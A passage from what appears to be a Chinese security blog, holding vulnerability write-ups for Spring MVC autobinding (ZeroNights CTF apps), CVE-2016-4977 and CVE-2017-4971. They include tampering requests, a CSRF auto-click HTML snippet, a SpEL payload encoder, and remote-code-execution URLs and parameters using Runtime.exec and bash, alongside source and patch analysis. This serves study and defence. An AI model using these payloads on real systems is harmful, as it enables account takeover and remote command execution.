user，那么在创建UserForm实例时以“userForm”为键值存储在Model对象中，和model.addAtttribute(&quot;userForm&quot;, user)语句的功能一样。 2、注解一个非请求处理方法 被@ModelAttribute注解的方法将在每次调用该控制器类的请求处理方法前被调用。这种特性可以用来控制登录权限，当然控制登录权限的方法有很多，例如拦截器、过滤器等。 使用该特性控制登录权限，创建BaseController，代码如下所示： 1234567891011package controller;import javax.servlet.http.HttpSession;import org.springframework.web.bind.annotation.ModelAttribute;public class BaseController &#123; @ModelAttribute public void isLogin(HttpSession session) throws Exception &#123; if (session.getAttribute(\"user\") == null) &#123; throw new Exception(\"没有权限\"); &#125; &#125;&#125; 创建ModelAttributeController，代码如下所示： 1234567891011121314151617package controller;import org.springframework.web.bind.annotation.RequestMapping;@RequestMapping(\"/admin\")public class ModelAttributeController &#123; @RequestMapping(\"/add\") public String add() &#123; return \"addSuccess\"; &#125; @RequestMapping(\"/update\") public String update() &#123; return \"updateSuccess\"; &#125; @RequestMapping(\"/delete\") public String delete() &#123; return \"deleteSuccess\"; &#125;&#125; 在上述ModelAttributeController类中的add、update、delete请求处理方法执行时，首先执行父类BaseController中的isLogin()方法判断登录权限，可以通过地址http://localhost:8080/springMVCDemo02/admin/add测试登录权限。 @SessionAttributes注解默认情况下Spring MVC将模型中的数据存储到request域中。当一个请求结束后，数据就失效了。如果要跨页面使用。那么需要使用到session。而@SessionAttributes注解就可以使得模型中的数据存储一份到session域中。 Spring 允许我们有选择地指定 ModelMap 中的哪些属性需要转存到 session 中，以便下一个请求对应的 ModelMap 的属性列表中还能访问到这些属性。这一功能是通过类定义处标注 @SessionAttributes(“user”) 注解来实现的。SpringMVC 就会自动将 @SessionAttributes 定义的属性注入到 ModelMap 对象，在 setup action 的参数列表时，去 ModelMap 中取到这样的对象，再添加到参数列表。只要不去调用 SessionStatus 的 setComplete() 方法，这个对象就会一直保留在 Session 中，从而实现 Session 信息的共享。 0x02 案例这里参考ZeroNigths HackQuest 2016的两道和自动绑定漏洞相关的Web题，源码下载地址: https://github.com/3wapp/ZeroNights-HackQuest-2016 Justice League将war包放置于Tomcat中跑起来后，看到Justice League页面存在4个功能点：关于、注册、登录、找回密码。 代码审计下面先进行代码审计，直接看到注册功能的Controller，ResetPasswordController.java： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657@Controller@SessionAttributes(\"user\")public class ResetPasswordController &#123; private static final Logger logger = LoggerFactory.getLogger(ResetPasswordController.class); @Autowired private UserService userService; @RequestMapping(value = \"/reset\", method = RequestMethod.GET) public String resetViewHandler() &#123; logger.info(\"Welcome reset ! \"); return \"reset\"; &#125; @RequestMapping(value = \"/reset\", method = RequestMethod.POST) public String resetHandler(@RequestParam String username, Model model) &#123; logger.info(\"Checking username \" + username); User user = userService.findByName(username); if (user == null) &#123; logger.info(\"there is no user with name \" + username); model.addAttribute(\"error\", \"Username is not found\"); return \"reset\"; &#125; model.addAttribute(\"user\", user); return \"redirect:resetQuestion\"; &#125; @RequestMapping(value = \"/resetQuestion\", method = RequestMethod.GET) public String resetViewQuestionHandler(@ModelAttribute User user) &#123; logger.info(\"Welcome resetQuestion ! \" + user); return \"resetQuestion\"; &#125; @RequestMapping(value = \"/resetQuestion\", method = RequestMethod.POST) public String resetQuestionHandler(@RequestParam String answerReset, SessionStatus status, User user, Model model) &#123; logger.info(\"Checking resetQuestion ! \" + answerReset + \" for \" + user); if (!user.getAnswer().equals(answerReset)) &#123; logger.info(\"Answer in db \" + user.getAnswer() + \" Answer \" + answerReset); model.addAttribute(\"error\", \"Incorrect answer\"); return \"resetQuestion\"; &#125; status.setComplete(); String newPassword = GeneratePassword.generatePassowrd(10); user.setPassword(newPassword); userService.updateUser(user); model.addAttribute(\"message\", \"Your new password is \" + newPassword); return \"success\"; &#125;&#125; 简单理下： ResetPasswordController类是被@SessionAttributes(&quot;user&quot;)注解修饰的，即会自动把user对象放到session中。 这里/reset接口就是直接对应的resetHandler()函数。在POST方式的resetHandler()函数中，先判断当前用户名是否存在，若存在则将user添加到model中，再重定向到resetQuestion中作进一步处理；可以看到，两个resetHandler()函数都没有直接从参数或者从session中获取user对象，因此resetHandler()函数不存在自动绑定漏洞。 这里/resetQuestion接口就是直接对应的resetQuestionHandler()函数。在GET方式的resetQuestionHandler()函数中，其唯一的user参数使用了·@ModelAttribute·注解修饰，即会将传递过来的user参数按名称注入到指定对象中，而这里实际上是从session中获取user对象；在POST方式的函数中，并没有使用@ModelAttribute注解修饰参数，但是Spring MVC会自动从session中提取user，并且使用相同的逻辑，用http请求参数去自动绑定对应的用户参数，该函数的代码逻辑，先获取user对象的answer属性值来跟我们从外部表单输入的answerReset值进行比较，若相等则往下成功重置用户密码，否则报错；也就是说，这两个resetQuestionHandler()函数都用到了session中的user对象，都存在自动绑定漏洞。 由前面分析可知，resetQuestionHandler()函数就是自动绑定漏洞的逻辑漏洞代码所在，我们只需要对这个接口的以GET或POST方式传递User类对象的参数即可修改自动绑定的user对象的属性值，实现自动绑定漏洞的利用。 攻击利用我们先点击忘记密码，在这里输入admin用户名检测是否存在该用户： 若存在则直接跳转到/resetQuestion界面，这里是个密保找回的表单： 现在已知是存在admin用户的，下面就对admin用户进行自动绑定漏洞的攻击利用。 攻击GET方式的/resetQuestion接口直接往/resetQuestion接口发送包含user对象属性的参数即可直接篡改user对象的属性值： GET /justiceleague/resetQuestion?answer=mi1k7ea 在Tomcat后台是可以看到日志记录了将admin用户的answer属性篡改了： 当然，user对象的其他参数也是可以直接通过变量绑定漏洞直接修改的，比如直接修改admin用户的密码： 攻击POST方式的/resetQuestion接口提交POST表单的页面就是前面/resetQuestion的界面，我们知道该表单包含两个参数即question和answerReset。 我们这里在原报文的基础上，直接添加user对象的属性为参数来篡改user属性值： 可以看到，虽然我们不知道真正的密保答案即admin用户的answer属性值，因此输入错误的answerReset参数值后就会显示回答错误，但是我们却成功篡改了admin的password，其他属性也是一样的操作即可。 除了这种利用方式外，POST方式的resetQuestionHandler()函数中还存在逻辑漏洞，即找回密码过程中进行密保问题回答的处理过程存在自动绑定漏洞绕过的风险。现在，我们只需要在原本POST报文的基础上加上answer参数、使其值直接和answerReset参数的一致，由于自动绑定漏洞的存在，将导致后台程序在比较user对象的answer属性值和我们表单提交的answerReset参数值是否相等时直接绕过了，从而执行了后面的代码实现密码重置： 此时到Tomcat后台查看，admin用户的answer被篡改为test，password被成功重置了和页面返回的一样： Edik将war包放置于Tomcat中跑起来后，看到Edik主要有主页、注册、登录等几个页面。 代码审计打开源码Controller部分，发现只有HomeController和RegistrationController这两个Controller文件。而其中使用@ModelAttribute或@SessionAttributes注解的只有HomeController这个文件，也就是说，有且仅有HomeController中会存在自动绑定漏洞。 我们看到HomeController的源码，这里只看有相关注解的部分即可： 1234567891011121314151617181920212223242526272829@Controller@SessionAttributes(\"user\")public class HomeController &#123; ... @ModelAttribute(\"secondSecret\") public String getSecretCode() &#123; logger.debug(secondSecret); return secondSecret; &#125; @ModelAttribute(\"showSecret\") public Boolean getShowSectet() &#123; logger.debug(\"flag: \" + showSecret); return showSecret; &#125; @RequestMapping(value = \"/home\", method = RequestMethod.GET) public String home(@ModelAttribute User user, Model model) &#123; if (showSecret)&#123; model.addAttribute(\"firstSecret\", firstSecret); &#125; return \"home\"; &#125; ...&#125; 分析可知： HomeController使用@SessionAttributes注解修饰user对象，说明user对象会保存到session中； 使用@ModelAttribute注解的地方总共有3处，前两处是修饰方法，使方法在每次调用该控制器类的请求处理方法前被调用，主要用于日志记录；第三处是修饰的/home接口对应的home()函数的user参数，该接口是GET方式访问的； 由此可知，HomeController的home()函数处是存在自动绑定漏洞的，因为通过注解和自动绑定机制我们可以直接通过参数的形式给home()函数的user对象传递恶意的属性值，而最后返回”home”会跳转到home界面进行展示。 攻击利用这个站点本身没有更多的业务功能能让我们进行更深的利用。 常规利用先注册个用户，然后登录，看到是跳转到了/home路径，这里页面展示了当前用户名和体重信息： 这里直接对/home接口以GET方式传递user对象的属性值，比如直接篡改用户名： User类对象的另外两个属性password和weight也是同样能被修改的。 自动绑定漏洞+XSS组合拳这里很鸡肋： 自动绑定漏洞+CSRF组合拳此外，自动绑定漏洞能和CSRF组合利用。 比如将修改password的自动绑定漏洞的链接和CSRF组合，通过诱使受害者访问即可成功修改受害者的密码，恶意csrf.html如下： 12345&lt;a href='http://192.168.10.1:8080/edik/home?password=666'&gt;Click Me&lt;/a&gt;&lt;script&gt; var m = document.getElementsByTagName('a')[0]; m.click();&lt;/script&gt; 0x03 防御方法Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。 0x04 参考浅析自动绑定漏洞 Spring MVC Autobinding漏洞实例初窥 【技术分享】自动绑定漏洞和Spring MVC Spring MVC 自动绑定漏洞 Spring MVC中@ModelAttribute注解的使用","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"浅析Spring Security OAuth2之CVE-2016-4977","date":"2020-02-09T14:22:22.000Z","path":"2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/","text":"0x01 Spring Security OAuth2OAuth2OAuth 2.0是用于授权的行业标准协议，核心思路是通过各类认证手段（具体什么手段OAuth 2.0不关心）认证用户身份，并颁发token，使得第三方应用可以使用该token在限定时间、限定范围内访问指定资源。OAuth 2.0致力于简化客户端开发人员的工作，同时为Web应用程序、桌面应用程序、移动电话和客厅设备提供特定的授权流程。 OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。 “客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。 校验流程如图： 具体的讲解可参考：《理解OAuth 2.0》 Spring Security OAuth2Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块，主要包含认证服务器和资源服务器这两大块的实现： Spring Security OAuth2主要包含认证服务器和资源服务器这两大块的实现： 认证服务器主要包含了四种授权模式的实现和Token的生成与存储，我们也可以在认证服务器中自定义获取Token的方式；资源服务器主要是在Spring Security的过滤器链上加了OAuth2AuthenticationProcessingFilter过滤器，即使用OAuth2协议发放令牌认证的方式来保护我们的资源。 更多的参考官方文档即可。 0x02 CVE-2016-4977在Spring Security OAuth2的漏洞版本中，当用户使用whitelabel views来处理错误时，由于使用了SpEL表达式，攻击者在被授权的情况下可以通过构造恶意参数来RCE。 影响版本 2.0.0 to 2.0.9 1.0.0 to 1.0.5 环境搭建参考Vulhub：https://vulhub.org/#/environments/spring/CVE-2016-4977/ 漏洞复现访问如下链接，使用admin:admin登录： 123http://your-ip:8080/oauth/authorize?response_type=$&#123;123*456&#125;&amp;client_id=acme&amp;redirect_uri=http://test或http://your-ip:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;123*456&#125; 在页面响应中会发现URL其中的参数的SpEL表达式会被解析，前面两个不同参数的注入在页面显示的报错信息也不一样： 123error=&quot;unsupported_response_type&quot;, error_description=&quot;Unsupported response types: [56088]&quot;或error=&quot;invalid_grant&quot;, error_description=&quot;Invalid redirect: 56088 does not match one of the registered values: [http://localhost]&quot; 此时已证明是存在SpEL表达式注入漏洞了。下面就进行漏洞利用。 注意，如果直接将对应的参数改为恶意的SpEL表达式来尝试执行某些命令的话会发现大多数不能成功，原因可参考：Java Runtime.getRuntime().exec() 的那些payloads 这里直接用P神的脚本，原理是会用ord()函数将命令中的每个字符转换为ASCII码，再通过字符串拼接以及调用toString()函数来实现命令还原： 123456789101112#!/usr/bin/env pythonmessage = input('Enter message to encode:')poc = '$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])for ch in message[1:]: poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) poc += ')&#125;'print(poc) 这里输入touch /tmp/mi1k7ea，生成如下内容： 1$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125; 最后将该内容替换到前面URL的会被SpEL解析的参数中构造出最终的PoC： 1http://your-ip:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;&amp;client_id=acme&amp;redirect_uri=http://test 访问后页面显示如下： 到后台发现命令成功执行： 漏洞分析这里就不逐步调试分析了，直接看到关键的几个函数。 这里我们选择2.0.9版本的Spring Security Oauth的代码来分析。 由前面页面的显示知道，在Spring Security Oauth2中是使用了whitelabel views来处理错误的，而漏洞点正是出在这个错误的处理过程中。 接着我们找到对应的错误处理的源码路径：https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java 看到WhitelabelErrorEndpoint类中，其含有一个handlerError()函数用于处理错误，这里会获取请求中的error，将其转换为OAuth2Exception类型，然后调用getSummary()函数来获取错误信息并进行HTML编码后赋值给errorSummary变量，将该变量put进model中，最后用SpelView()来渲染： 12345678910111213141516171819202122232425262728/** * Controller for displaying the error page for the authorization server. * * @author Dave Syer */@FrameworkEndpointpublic class WhitelabelErrorEndpoint &#123; private static final String ERROR = \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;\"; @RequestMapping(\"/oauth/error\") public ModelAndView handleError(HttpServletRequest request) &#123; Map&lt;String, Object&gt; model = new HashMap&lt;String, Object&gt;(); Object error = request.getAttribute(\"error\"); // The error summary may contain malicious user input, // it needs to be escaped to prevent XSS String errorSummary; if (error instanceof OAuth2Exception) &#123; OAuth2Exception oauthError = (OAuth2Exception) error; errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary()); &#125; else &#123; errorSummary = \"Unknown error\"; &#125; model.put(\"errorSummary\", errorSummary); return new ModelAndView(new SpelView(ERROR), model); &#125;&#125; 这里errorSummary变量的值就是获取的我们输入的恶意参数的值即恶意SpEL表达式，此时errorSummary变量值为前面生成的PoC的内容即${T(java.lang.Runtime).getRuntime().exec(...)}。 接着我们看下SpelView类的源码，路径为：https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java 12345678910111213141516171819202122232425262728293031/** * Simple String template renderer. * */class SpelView implements View &#123; ... public SpelView(String template) &#123; this.template = template; this.context.addPropertyAccessor(new MapAccessor()); this.helper = new PropertyPlaceholderHelper(\"$&#123;\", \"&#125;\"); this.resolver = new PlaceholderResolver() &#123; public String resolvePlaceholder(String name) &#123; Expression expression = parser.parseExpression(name); Object value = expression.getValue(context); return value == null ? null : value.toString(); &#125; &#125;; &#125; ... public void render(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response) throws Exception &#123; ... String result = helper.replacePlaceholders(template, resolver); ... &#125;&#125; 看到以下两个函数： 在SpelView类的构造函数中，传参是赋值给了template属性即模板，helper属性是PropertyPlaceholderHelper类型、其中的两个传参分别是包括表达式字符串的前缀和后缀字符串，resolver属性是规定了如何解析这个错误信息、这里看到是定义了resolvePlaceholder()函数，该函数是将传参定义为Expression类型的表达式，再调用expression.getValue(context)，这就是SpEL表达式解析的地方，也是漏洞最后执行的地方。 在render()函数中，负责渲染页面，这里会调用replacePlaceholders()函数来使用resolver属性作为解析器、template属性作为模板进行页面的解析渲染。 在前面的ModelAndView类的构造函数中使用SpelView类来渲染页面，必然会调用到render()函数，而该函数调用了replacePlaceholders()函数。我们跟进该函数看看，路径为：https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java 123456789101112131415161718192021/** * Replaces all placeholders of format &#123;@code $&#123;name&#125;&#125; with the value returned * from the supplied &#123;@link PlaceholderResolver&#125;. * @param value the value containing the placeholders to be replaced * @param placeholderResolver the &#123;@code PlaceholderResolver&#125; to use for replacement * @return the supplied value with placeholders replaced inline */public String replacePlaceholders(String value, PlaceholderResolver placeholderResolver) &#123; Assert.notNull(value, \"'value' must not be null\"); return parseStringValue(value, placeholderResolver, new HashSet&lt;String&gt;());&#125;protected String parseStringValue( String strVal, PlaceholderResolver placeholderResolver, Set&lt;String&gt; visitedPlaceholders) &#123; ... // Recursive invocation, parsing placeholders contained in the placeholder key. placeholder = parseStringValue(placeholder, placeholderResolver, visitedPlaceholders); // Now obtain the value for the fully resolved key... String propVal = placeholderResolver.resolvePlaceholder(placeholder); ... 看到replacePlaceholders()函数中是直接调用了parseStringValue()函数来进一步解析；在parseStringValue()函数中，递归调用了自身以获取前面SpelView类实例helper属性的前缀和后缀字符串括起来的内容并赋值给placeholder变量，接着就调用了SpelView类实例resolver属性的resolvePlaceholder()函数来解析这个placeholder变量值即我们输入的恶意SpEL表达式，从而在resolvePlaceholder()函数中调用了expression.getValue(context)导致SpEL表达式注入漏洞的触发。 补丁分析看下2.0.10版本的补丁怎么打的：https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a 可以看到在第一次执行表达式之前程序将$替换成了由RandomValueStringGenerator().generate()生成的随机字符串，也就是${errorSummary} -&gt; random{errorSummary}，但是这个替换不是递归的，所以${2334-1}并没有变。 然后创建了一个helper使程序取random{}中的内容作为表达式，这样就使得errorSummary被作为表达式执行了，而${2334-1}因为不符合random{}这个形式所以没有被当作表达式，从而也就没有办法被执行了。 不过这个Patch有一个缺点：RandomValueStringGenerator生成的字符串虽然内容随机，但长度固定为6，所以存在暴力破解的可能性。 0x03 参考Spring Security OAuth RCE (CVE-2016-4977) 漏洞分析","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"浅析Spring Web Flow之CVE-2017-4971","date":"2020-02-09T04:12:36.000Z","path":"2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/","text":"0x01 Spring Web FlowSpring Web Flow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来，其最主要的目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题。 具体更多的简介可参考IBM的文章：Spring Web Flow 2.0 入门 0x02 CVE-2017-4971在Spring Web Flow 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。 影响版本 Spring Web Flow 2.4.0 ~ 2.4.4 一些老的不再支持的版本也受影响 环境搭建参考Vulapps的环境（Vulhub的环境在下载时老不成功）： http://vulapps.evalbug.com/s_springwebflow_1/ 前提条件 在Web Flow配置文件中view-state节点中指定了model属性，并且没有指定绑定的参数，即view-state中没有配置binder节点； MvcViewFactoryCreator类中useSpringBeanBinding默认值（false）未修改； 漏洞复现先访问/login的接口登录进去，然后随便选择一家酒店点击Book来预订，最后点击Confirm确认，同时用Burp拦截这个Confirm报文，在POST的请求内容中添加如下PoC参数： 123&amp;_T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)或&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;touch /tmp/mi1k7ea&quot;)).start() 此时后台就能看到SpEL表达式注入漏洞被成功触发了： 漏洞分析这里就不逐步调试分析了，只从补丁处开始做简单的漏洞点分析。 代码路径：https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java 漏洞点位于AbstractMvcView类的addEmptyValueMapping()函数，这里ExpressionParser.parseExpression()函数是用于执行传入的第一个参数field的SpEL表达式，即关键在于addEmptyValueMapping()函数第二个参数field是否外部可控： 12345678910111213141516171819202122/** * Adds a special &#123;@link DefaultMapping&#125; that results in setting the target field on the model to an empty value * (typically null). * * @param mapper the mapper to add the mapping to * @param field the field for which a mapping is to be added * @param model the model */protected void addEmptyValueMapping(DefaultMapper mapper, String field, Object model) &#123; ParserContext parserContext = new FluentParserContext().evaluate(model.getClass()); Expression target = expressionParser.parseExpression(field, parserContext); try &#123; Class&lt;?&gt; propertyType = target.getValueType(model); Expression source = new StaticExpression(getEmptyValue(propertyType)); DefaultMapping mapping = new DefaultMapping(source, target); if (logger.isDebugEnabled()) &#123; logger.debug(\"Adding empty value mapping for parameter '\" + field + \"'\"); &#125; mapper.addMapping(mapping); &#125; catch (EvaluationException e) &#123; &#125;&#125; 调用addEmptyValueMapping()的函数有两个，都在AbstractMvcView类中，分别为addModelBindings()和addDefaultMappings()： 12345678910111213141516171819202122232425protected void addDefaultMappings(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model) &#123; for (String parameterName : parameterNames) &#123; if (fieldMarkerPrefix != null &amp;&amp; parameterName.startsWith(fieldMarkerPrefix)) &#123; String field = parameterName.substring(fieldMarkerPrefix.length()); if (!parameterNames.contains(field)) &#123; addEmptyValueMapping(mapper, field, model); &#125; &#125; else &#123; addDefaultMapping(mapper, parameterName, model); &#125; &#125;&#125;protected void addModelBindings(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model) &#123; for (Binding binding : binderConfiguration.getBindings()) &#123; String parameterName = binding.getProperty(); if (parameterNames.contains(parameterName)) &#123; addMapping(mapper, binding, model); &#125; else &#123; if (fieldMarkerPrefix != null &amp;&amp; parameterNames.contains(fieldMarkerPrefix + parameterName)) &#123; addEmptyValueMapping(mapper, parameterName, model); &#125; &#125; &#125;&#125; 可以看到，这两个函数都调用了存在缺陷的函数，那么我们看看哪个函数才能实际控制field参数。 这里比较明显的区别就是 addModelBindings 函数中 for (Binding binding : binderConfiguration.getBindings()) 存在这样一个循环，而且就是这个循环的控制决定了 field 参数的值，经过进一步分析，这里控制 field 的参数的决定性因素就是 binderConfiguration 这个变量所控制的值，这里经过源码的跟踪我们可以发现，binderConfiguration 函数的值就是 webflow-*.xml 中 view-state 中 binder 节点的配置，所以这个函数的值来源于配置文件，所以这个函数我们无法控制，从而无法触发漏洞，所以我们重点来看看 addDefaultMappings 这个函数，我们发现 addDefaultMappings 中我们可以控制 field 参数，所以我们重点来看看如何去触发这个函数。 而同文件中的bind()函数是根据binderConfiguration值是否为null来区分调用这两个函数： 12345678910111213protected MappingResults bind(Object model) &#123; if (logger.isDebugEnabled()) &#123; logger.debug(\"Binding to model\"); &#125; DefaultMapper mapper = new DefaultMapper(); ParameterMap requestParameters = requestContext.getRequestParameters(); if (binderConfiguration != null) &#123; addModelBindings(mapper, requestParameters.asMap().keySet(), model); &#125; else &#123; addDefaultMappings(mapper, requestParameters.asMap().keySet(), model); &#125; return mapper.map(requestParameters, model);&#125; 这里看到当binderConfiguration值为null时才会调用漏洞函数addDefaultMappings()，这也是前提条件之一，在接下来会将原因。 最终，我们可以得到如下几个关键函数调用链： 1bind()-&gt;addDefaultMappings()-&gt;addEmptyValueMapping()-&gt;parseExpression() 必须view-state中未配置binder节点的原因我们看到bind()函数的源码，在spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView类中： 1234567891011121314151617181920212223242526/** * &lt;p&gt; * Causes the model to be populated from information contained in request parameters. * &lt;/p&gt; * &lt;p&gt; * If a view has binding configuration then only model fields specified in the binding configuration will be * considered. In the absence of binding configuration all request parameters will be used to update matching fields * on the model. * &lt;/p&gt; * * @param model the model to be updated * @return an instance of MappingResults with information about the results of the binding. */protected MappingResults bind(Object model) &#123; if (logger.isDebugEnabled()) &#123; logger.debug(\"Binding to model\"); &#125; DefaultMapper mapper = new DefaultMapper(); ParameterMap requestParameters = requestContext.getRequestParameters(); if (binderConfiguration != null) &#123; addModelBindings(mapper, requestParameters.asMap().keySet(), model); &#125; else &#123; addDefaultMappings(mapper, requestParameters.asMap().keySet(), model); &#125; return mapper.map(requestParameters, model);&#125; 这里有个if判断语句，条件是判断binderConfiguration是否为null。这里只有binderConfiguration为null时，才会进入后面调用存在漏洞的addDefaultMappings()函数的代码逻辑。而binderConfiguration的值是由配置文件中是否有binder节点来控制的。 看到spring-webflow/src/main/java/org/springframework/webflow/engine/model/builder/xml/XmlFlowModelBuilder类中相关的函数定义，其中parseState()函数用于解析节点，当判断到view-state节点后就调用parseViewState()函数作进一步解析处理，其中调用parseBinder()函数来获取binder字节的内容并设置到binder中，当不存在binder节点时直接返回null： 12345678910111213141516171819202122232425private AbstractStateModel parseState(Element element) &#123; if (DomUtils.nodeNameEquals(element, \"view-state\")) &#123; return parseViewState(element); &#125; ...&#125;private ViewStateModel parseViewState(Element element) &#123; ViewStateModel state = new ViewStateModel(element.getAttribute(\"id\")); ... state.setBinder(parseBinder(element)); ... return state;&#125;private BinderModel parseBinder(Element element) &#123; Element binderElement = DomUtils.getChildElementByTagName(element, \"binder\"); if (binderElement != null) &#123; BinderModel binder = new BinderModel(); binder.setBindings(parseBindings(binderElement)); return binder; &#125; else &#123; return null; &#125;&#125; 上述代码中没找到binder节点后就会返回null，之后binderConfiguration的值就被设置为了null。 必须useSpringBeanBinding默认值（false）未修改的原因为啥前提条件要useSpringBeanBinding为默认值false即未修改过？ 查看spring-webflow/src/main/java/org/springframework/webflow/mvc/builder/MvcViewFactoryCreator类的createViewFactory()函数，看到如果useSpringBeanBinding这个属性为false则使用默认的解析类，如果这个值为true则使用BeanWrapperExpressionParser类来解析，而该类是无法执行SpEL表达式的（具体可看补丁分析）： 123456789101112131415161718public ViewFactory createViewFactory(Expression viewId, ExpressionParser expressionParser, ConversionService conversionService, BinderConfiguration binderConfiguration, Validator validator, ValidationHintResolver validationHintResolver) &#123; if (useSpringBeanBinding) &#123; expressionParser = new BeanWrapperExpressionParser(conversionService); &#125; AbstractMvcViewFactory viewFactory = createMvcViewFactory(viewId, expressionParser, conversionService, binderConfiguration); if (StringUtils.hasText(eventIdParameterName)) &#123; viewFactory.setEventIdParameterName(eventIdParameterName); &#125; if (StringUtils.hasText(fieldMarkerPrefix)) &#123; viewFactory.setFieldMarkerPrefix(fieldMarkerPrefix); &#125; viewFactory.setValidator(validator); viewFactory.setValidationHintResolver(validationHintResolver); return viewFactory;&#125; 补丁分析查看官方在Spring Web Flow 2.4.5 版本中的补丁是怎么写的：https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523#diff-d9efeba3700c0135e224911fadb39795 直接将ExpressionParser设置为BeanWrapperExpressionParser对象的实例，默认是执行不了表达式的。 查看BeanWrapperExpressionParser的源码：https://github.com/spring-projects/spring-webflow/blob/v2.4.5.RELEASE/spring-binding/src/main/java/org/springframework/binding/expression/beanwrapper/BeanWrapperExpressionParser.java 其中的parseExpression()函数是直接继承的spring-webflow/spring-binding/src/main/java/org/springframework/binding/expression/support/AbstractExpressionParser类的： 12345678910111213141516171819202122232425262728// expression parserpublic Expression parseExpression(String expressionString, ParserContext context) throws ParserException &#123; Assert.notNull(expressionString, \"The expression string to parse is required\"); if (context == null) &#123; context = NullParserContext.INSTANCE; &#125; if (context.isTemplate()) &#123; return parseTemplate(expressionString, context); &#125; else &#123; if (expressionString.startsWith(getExpressionPrefix()) &amp;&amp; expressionString.endsWith(getExpressionSuffix())) &#123; if (!allowDelimitedEvalExpressions) &#123; throw new ParserException( expressionString, \"The expression '\" + expressionString + \"' being parsed is expected be a standard OGNL expression. Do not attempt to enclose such expression strings in $&#123;&#125; delimiters--this is redundant. If you need to parse a template that mixes literal text with evaluatable blocks, set the 'template' parser context attribute to true.\", null); &#125; else &#123; int lastIndex = expressionString.length() - getExpressionSuffix().length(); String ognlExpression = expressionString.substring(getExpressionPrefix().length(), lastIndex); return doParseExpression(ognlExpression, context); &#125; &#125; else &#123; return doParseExpression(expressionString, context); &#125; &#125;&#125; 注意，这里if判断条件的allowDelimitedEvalExpressions，这个默认值是false，因此默认是不能进入里面的代码逻辑、也就执行不了表达式了。 0x03 参考Spring Web Flow 